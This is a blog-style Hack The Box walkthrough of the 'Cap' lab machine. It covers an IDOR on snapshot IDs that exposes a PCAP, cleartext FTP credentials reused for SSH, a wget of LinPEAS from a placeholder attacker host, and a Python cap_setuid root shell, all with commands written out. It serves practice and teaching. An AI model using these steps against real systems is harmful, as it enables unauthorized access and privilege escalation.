---
layout: post
title: "Cap Hack The Box Walkthrough"
date: 2026-09-28
categories: [HackTheBox]
tags: [hackthebox, linux, ftp, pcap, idor, capabilities, privilege-escalation]
---

# Cap - Hack The Box Walkthrough

[Cap - Hack The Box Machine](https://www.hackthebox.com/machines/cap){:target="_blank"}

## Overview

**Difficulty:** Easy  
**Platform:** Hack The Box  
**Operating System:** Linux  
**Machine rating:** 4.6/5  
**Focus:** PCAP analysis, FTP credentials, IDOR, Linux capabilities

Cap exposes a security dashboard that creates network snapshots. By changing the snapshot ID in the URL, we can access other scans, including a PCAP containing unencrypted FTP traffic. The captured credentials work over SSH for the initial foothold. On the machine, Python has the `cap_setuid` capability, which can be used to become root.

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -Pn -p- -oN cap_scan 10.129.120.123
```

### Open Ports

The scan found three open TCP ports:

- **21/tcp** - FTP (vsftpd 3.0.3)
- **22/tcp** - SSH (OpenSSH 8.2p1 Ubuntu)
- **80/tcp** - HTTP (Gunicorn; Security Dashboard)

## Finding the PCAP

The web application provides a **Security Snapshot** action. After taking a snapshot, the browser redirects to a URL in the form `/data/[id]`. The route name is `data`.

Changing the numeric ID allows access to other users' scans. IDs `0` through `6` were accessible during this enumeration. Scan ID `0` contained the PCAP with sensitive data.

## Recovering FTP Credentials

Inspecting the PCAP in Wireshark shows an FTP login in cleartext. The capture contains the `USER` and `PASS` requests:

```text
Request: USER nathan
Request: PASS Buck3tH4TF0RM3!
Response: 230 Login successful.
```

Because FTP transmits credentials without encryption, the username and password can be recovered directly from the captured traffic. The same password works for SSH:

```bash
ssh nathan@10.129.120.123
```

After logging in as `nathan`, the user flag is in the home directory:

```bash
cat /home/nathan/user.txt
```

## Privilege Escalation

To enumerate the host, LinPEAS was served from the attacker machine and downloaded to Cap. Start a temporary HTTP server in the directory containing `linpeas.sh`:

```bash
python3 -m http.server 8000
```

Then, from the SSH session, download and run the script:

```bash
wget http://<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > linpeas.txt
```

LinPEAS identified `/usr/bin/python3.8` with the `cap_setuid` and `cap_net_bind_service` capabilities. `cap_setuid` allows the process to change its user ID to root. Start Python and spawn a shell after setting the UID to `0`:

```bash
/usr/bin/python3.8
```

```python
import os
os.setuid(0)
os.system("/bin/sh")
```

The resulting shell runs as root. Read the root flag from `/root/root.txt`:

```bash
cat /root/root.txt
```

## Key Takeaways

- FTP exposed the user's credentials in plaintext inside a captured PCAP.
- The dashboard's scan ID could be changed to access other users' snapshots.
- Reusing the FTP password for SSH turned the captured credential into an initial foothold.
- The `cap_setuid` capability on Python allowed privilege escalation to root.